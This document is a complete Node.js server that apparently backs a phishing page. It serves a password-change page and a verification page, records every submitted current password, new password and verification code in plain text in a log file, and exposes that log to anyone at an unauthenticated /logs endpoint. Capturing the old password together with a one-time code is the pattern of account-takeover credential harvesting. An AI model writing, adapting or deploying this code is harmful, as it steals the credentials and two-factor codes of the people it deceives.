var http = require('http');
var fs   = require('fs');
var path = require('path');

var LOG_FILE = path.join(__dirname, 'submissions.log');

function readBody(req, callback) {
  var data = '';
  req.on('data', function(chunk) { data += chunk; });
  req.on('end', function() {
    try { callback(JSON.parse(data)); }
    catch(e) { callback({}); }
  });
}

function serveFile(res, filePath, contentType) {
  fs.readFile(filePath, function(err, data) {
    if (err) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

var server = http.createServer(function(req, res) {

  if (req.method === 'GET' && req.url === '/') {
    serveFile(res, path.join(__dirname, 'index.html'), 'text/html');

  } else if (req.method === 'GET' && req.url === '/verify') {
    serveFile(res, path.join(__dirname, 'verify.html'), 'text/html');

  } else if (req.method === 'GET' && req.url === '/logs') {
    if (!fs.existsSync(LOG_FILE)) {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('No logs yet.');
      return;
    }
    var content = fs.readFileSync(LOG_FILE, 'utf8');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(content);

  } else if (req.method === 'POST' && req.url === '/log-password-change') {
    readBody(req, function(body) {
      var timestamp = new Date().toISOString();
      var entry = '--- Password Change Submission ---\n'
        + 'Timestamp:        ' + timestamp + '\n'
        + 'Current Password: ' + (body.currentPassword || '') + '\n'
        + 'New Password:     ' + (body.newPassword || '') + '\n'
        + 'Verify Password:  ' + (body.verifyPassword || '') + '\n\n';
      fs.appendFileSync(LOG_FILE, entry);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });

  } else if (req.method === 'POST' && req.url === '/log-verification') {
    readBody(req, function(body) {
      var timestamp = new Date().toISOString();
      var entry = '--- Verification Code Submission ---\n'
        + 'Timestamp:         ' + timestamp + '\n'
        + 'Verification Code: ' + (body.verificationCode || '') + '\n\n';
      fs.appendFileSync(LOG_FILE, entry);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });

  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

server.listen(process.env.PORT || 3000, function() {
  console.log('Server running');
});
